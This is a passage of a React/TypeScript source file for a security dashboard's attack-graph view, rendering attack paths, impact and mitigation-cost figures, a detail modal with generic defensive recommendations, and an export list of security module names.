                      {(path.totalProbability * 100).toFixed(1)}%
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-sm text-cyber-muted">Impact</div>
                    <div className="text-lg font-bold text-red-500">
                      ${(path.impact / 1000000).toFixed(1)}M
                    </div>
                  </div>
                </div>
              </div>
              <div className="flex items-center justify-between text-sm">
                <div className="flex items-center space-x-4">
                  <span className="text-cyber-muted">
                    {path.nodes.length} nodes • {path.edges.length} edges
                  </span>
                </div>
                <span className="text-green-500">
                  Mitigation: ${path.mitigationCost.toLocaleString()}
                </span>
              </div>
            </div>
          ))}
        </div>
      ) : (
        <div className="cyber-card p-6">
          <div className="text-center py-12 text-cyber-muted">
            <Network className="w-16 h-16 mx-auto mb-4 opacity-50" />
            <p>Interactive graph visualization would render here</p>
            <p className="text-sm mt-2">Showing {paths.length} attack paths</p>
            <div className="mt-6 flex justify-center space-x-8">
              {paths.slice(0, 3).map((path, idx) => (
                <div key={path.id} className="text-left">
                  <div className="text-cyber-lime font-medium mb-2">Path {idx + 1}</div>
                  <div className="space-y-1 text-sm">
                    {path.nodes.map((node) => (
                      <div key={node.id} className="flex items-center space-x-2">
                        <div className={`w-2 h-2 rounded-full ${
                          node.type === 'attacker' ? 'bg-red-500' :
                          node.type === 'impact' ? 'bg-red-600' :
                          getSeverityColor(node.severity)
                        }`} />
                        <span className="text-white">{node.label}</span>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Path Detail Modal */}
      {selectedPath && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-3xl max-h-[90vh] bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <h2 className="text-xl font-bold text-white">Attack Path Analysis</h2>
              <button onClick={() => setSelectedPath(null)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6 overflow-y-auto max-h-[calc(90vh-80px)]">
              {/* Path Visualization */}
              <div className="mb-6">
                <div className="flex items-center justify-center space-x-2 flex-wrap">
                  {selectedPath.nodes.map((node, idx) => (
                    <div key={node.id} className="flex items-center">
                      <div className={`px-4 py-2 rounded-lg ${
                        node.type === 'attacker' ? 'bg-red-500 text-white' :
                        node.type === 'impact' ? 'bg-red-600 text-white' :
                        'bg-cyber-gray text-white'
                      }`}>
                        {node.label}
                      </div>
                      {idx < selectedPath.nodes.length - 1 && (
                        <ChevronRight className="w-6 h-6 text-cyber-muted mx-1" />
                      )}
                    </div>
                  ))}
                </div>
              </div>

              {/* Metrics */}
              <div className="grid grid-cols-3 gap-4 mb-6">
                <div className="p-4 bg-cyber-gray rounded-lg text-center">
                  <div className="text-2xl font-bold text-cyber-lime">
                    {(selectedPath.totalProbability * 100).toFixed(1)}%
                  </div>
                  <div className="text-sm text-cyber-muted">Success Probability</div>
                </div>
                <div className="p-4 bg-cyber-gray rounded-lg text-center">
                  <div className="text-2xl font-bold text-red-500">
                    ${(selectedPath.impact / 1000000).toFixed(1)}M
                  </div>
                  <div className="text-sm text-cyber-muted">Potential Impact</div>
                </div>
                <div className="p-4 bg-cyber-gray rounded-lg text-center">
                  <div className="text-2xl font-bold text-green-500">
                    ${selectedPath.mitigationCost.toLocaleString()}
                  </div>
                  <div className="text-sm text-cyber-muted">Mitigation Cost</div>
                </div>
              </div>

              {/* Mitigation Recommendations */}
              <div>
                <h4 className="text-white font-medium mb-3">Recommended Mitigations</h4>
                <div className="space-y-2">
                  {[
                    'Implement network segmentation to limit lateral movement',
                    'Deploy EDR solution on all endpoints',
                    'Enable multi-factor authentication for all accounts',
                    'Conduct regular security awareness training',
                    'Implement privileged access management (PAM)'
                  ].map((mitigation, idx) => (
                    <div key={idx} className="flex items-center space-x-3 p-3 bg-green-500/10 border border-green-500/30 rounded">
                      <CheckCircle className="w-5 h-5 text-green-500" />
                      <span className="text-white">{mitigation}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

// List icon
const ListIcon = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <line x1="8" y1="6" x2="21" y2="6"/>
    <line x1="8" y1="12" x2="21" y2="12"/>
    <line x1="8" y1="18" x2="21" y2="18"/>
    <line x1="3" y1="6" x2="3.01" y2="6"/>
    <line x1="3" y1="12" x2="3.01" y2="12"/>
    <line x1="3" y1="18" x2="3.01" y2="18"/>
  </svg>
);

// Export all modules
export {
  PentestingModule,
  MalwareAnalysisEngine,
  SOARModule,
  RedTeamBlueTeamSimulation,
  HoneypotModule,
  ThreatHuntingModule,
  DarkWebIntelligenceModule,
  CloudSecurityModule,
  ZeroTrustModule,
  AdvancedAIModule,
  FinancialImpactModule,
  AttackGraphModule
};
